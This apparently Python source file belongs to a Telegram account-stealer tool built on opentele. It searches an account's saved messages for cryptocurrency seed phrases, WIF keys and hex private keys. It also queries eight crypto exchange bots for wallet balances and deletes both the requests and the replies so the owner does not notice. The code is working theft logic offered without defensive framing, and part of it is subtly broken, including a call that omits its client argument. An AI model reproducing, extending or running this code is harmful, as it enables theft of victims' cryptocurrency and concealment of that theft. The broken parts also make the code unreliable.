# -*- coding: utf-8 -*-
from opentele.tl import TelegramClient
import asyncio
import re
from .text import parsing_crypto_from_srting

async def wait_for_response(client: TelegramClient, chat):
    for i in range(20):
        await asyncio.sleep(1)
        entity = await client.get_entity(chat)
        messages = await client.get_messages(chat)
        for event in messages:

            if "ℹ️" in event.text:
                try:
                    kb = event.reply_markup.rows[0].buttons[0].text
                    if '💼' in kb or '🏦' in kb:
                        message = await client.send_message(entity, kb)
                    try:
                        # type: ignore
                        await client.delete_messages(entity, [message.id])
                    except:
                        pass
                    try:
                        await client.delete_messages(entity, [event.id])
                    except:
                        pass
                except:
                    pass
            elif '💼' in event.text or '🏦' in event.text:
                try:
                    await client.delete_messages(entity, [event.id])
                except:
                    pass
                balance = re.findall(
                    r'(\d+.\d+\s\w+)|(\d+\s{0,1}\w+)\n', event.text)[0][1]
                return str(balance)
            else:
                try:
                    await client.delete_messages(entity, [event.id])
                except:
                    pass
    return '0'


async def check_user_messages_is_crypto(client: TelegramClient, config):
    try:
        seeds = []
        wifs = []
        hexs = []
        entity = await client.get_entity('me')
        async for m in client.iter_messages(entity):
            try:
                seeds_now, wif_now, hex_now = await parsing_crypto_from_srting(str(m.text).lower(),config)
                for seed in seeds_now:
                    seeds.append(seed)
                for wif in wif_now:
                    wifs.append(wif)

                for hex in hex_now:
                    hexs.append(hex)
            except:
                pass

        return seeds, wifs, hexs
    except Exception:
        return False


async def check_user_bots(client: TelegramClient):
    balance_info = ''

    async def work(chat: str):
        balance_info = False
        try:

            message = await client.send_message(chat, '/start')
            balance_message = await wait_for_response(chat)
            if balance_message is not False and balance_message != 'False':
                balance_info = f'$    {chat}: {balance_message}\n'
                await client.delete_messages(chat, [message.id])
        except:
            pass
        finally:
            return balance_info
    for chat in ['BTC_CHANGE_BOT', 'ETH_CHANGE_BOT', 'LTC_CHANGE_BOT', 'DASH_CHANGE_BOT', 'BCC_CHANGE_BOT', 'DOGE_CHANGE_BOT', 'TETHER_CHANGE_BOT', 'RUBM_CHANGE_BOT']:
        balance_info_ = await work(chat)
        if balance_info_ is not False:
            balance_info += balance_info_

    return balance_info
